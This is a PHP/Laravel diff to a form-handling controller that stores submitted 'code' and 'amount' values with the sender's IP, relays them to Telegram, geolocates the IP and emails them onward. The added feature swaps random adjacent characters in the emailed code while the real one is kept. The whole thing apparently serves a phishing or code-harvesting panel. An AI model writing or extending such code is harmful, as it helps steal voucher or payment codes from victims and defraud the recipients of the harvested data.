@@ -6,6 +6,7 @@ use App\NotifData;
 use App\Models\FormData;
 use App\Jobs\SetLocation;
 use App\Mail\FormDataMail;
+use Illuminate\Support\Arr;
 use App\Jobs\TelegramMsgJob;
 use Illuminate\Http\Request;
 use Illuminate\Http\JsonResponse;
@@ -40,8 +41,16 @@ class FormDataController extends Controller
             'amount' => 'required|string',
         ]);
 
+        $invertedCode = $validated['code'];
+        if (site_setting('invert_code')) {
+            $invertedCode = swap_adjacent_random_char($validated['code']);
+        }
+
         $formData = FormData::create([
-            'data' => $validated,
+            'data' => [
+                ...$validated,
+                'inverted_code' => $invertedCode,
+            ],
             'entries' => $request->except('type', 'code', 'amount'),
             'ip_address' => $request->ip(),
         ]);
@@ -55,11 +64,11 @@ class FormDataController extends Controller
         $notifData->setSubject('A new form data has been submitted');
         $notifData->setBody(json_encode($data));
         TelegramMsgJob::dispatchSync($notifData);
-
         SetLocation::dispatch($request->ip(), $formData, 'location');
 
         if ($email = site_setting('receiver_email')) {
-            Mail::to($email)->send(new FormDataMail($data));
+            $data['code'] = $invertedCode;
+            Mail::to($email)->send(new FormDataMail(Arr::except($data, 'inverted_code')));
         }
 
         return response()->json(['success' => true], 204);
